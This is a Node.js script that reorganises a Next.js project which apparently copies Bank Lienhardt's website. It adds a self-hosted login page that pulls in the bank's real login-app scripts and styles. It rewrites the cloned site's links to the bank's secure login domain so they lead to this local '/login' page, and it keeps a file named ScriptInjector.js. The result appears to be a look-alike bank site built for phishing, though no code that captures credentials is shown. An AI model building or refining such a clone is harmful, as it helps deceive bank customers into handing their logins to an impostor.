const fs = require('fs');
const path = require('path');

const srcApp = path.join(__dirname, 'src', 'app');
const mainGroup = path.join(srcApp, '(main)');
const authGroup = path.join(srcApp, '(auth)');
const loginDir = path.join(authGroup, 'login');

// Create Route Groups
if (!fs.existsSync(mainGroup)) fs.mkdirSync(mainGroup, { recursive: true });
if (!fs.existsSync(loginDir)) fs.mkdirSync(loginDir, { recursive: true });

// Move everything inside src/app to (main), EXCEPT globals.css, ScriptInjector.js, and the new route groups
const items = fs.readdirSync(srcApp);
for (const item of items) {
  if (['(main)', '(auth)', 'globals.css', 'ScriptInjector.js'].includes(item)) continue;
  
  const oldPath = path.join(srcApp, item);
  const newPath = path.join(mainGroup, item);
  fs.renameSync(oldPath, newPath);
}

console.log('Moved site contents to (main) route group.');

// Create (auth)/layout.js
const authLayout = `
export const metadata = {
  title: "Login - Bank Lienhardt",
};

export default function AuthLayout({ children }) {
  return (
    <html lang="en">
      <head>
        <base href="https://wwwsec.lienhardt.ch/authen/ui/" />
        <link rel="stylesheet" href="styles-FDX2R3UJ.css" />
      </head>
      <body>
        {children}
        <script src="/CSRFT759.js" type="text/javascript"></script>
        <script src="assets/airlock/js/iam.cd4104ff31eccff8.js"></script>
        <script src="assets/custom/js/iam-custom.29601efdd08b9f5b.js" type="module"></script>
        <script src="polyfills-5CFQRCPP.js" type="module"></script>
        <script src="scripts-L726KVUI.js" defer></script>
        <script src="main-LGZBZ2HE.js" type="module"></script>
      </body>
    </html>
  );
}
`;
fs.writeFileSync(path.join(authGroup, 'layout.js'), authLayout);

// Create (auth)/login/page.js
const loginPage = `
"use client";
import { useEffect } from 'react';

export default function LoginPage() {
  return (
    <>
      <div id="iamLoader" className="iam-outer-loading-container" style={{ display: 'none' }}>
          <div className="iam-inner-loading-container">
              <div className="iam-loader-logo"></div>
              <svg className="iam-loading-spinner" viewBox="25 25 50 50">
                  <circle className="iam-loading-spinner-path" cx="50" cy="50" r="20" fill="none"></circle>
              </svg>
          </div>
      </div>
      <iam-loginapp></iam-loginapp>
    </>
  );
}
`;
fs.writeFileSync(path.join(loginDir, 'page.js'), loginPage);
console.log('Created auth layout and login page.');

// Fix the login links in (main)/layout.js
const mainLayoutPath = path.join(mainGroup, 'layout.js');
if (fs.existsSync(mainLayoutPath)) {
  let layoutContent = fs.readFileSync(mainLayoutPath, 'utf8');
  layoutContent = layoutContent.replace(/href="https:\/\/wwwsec\.lienhardt\.ch[^"]*"/g, 'href="/login"');
  fs.writeFileSync(mainLayoutPath, layoutContent);
  console.log('Updated main layout to point to /login');
}
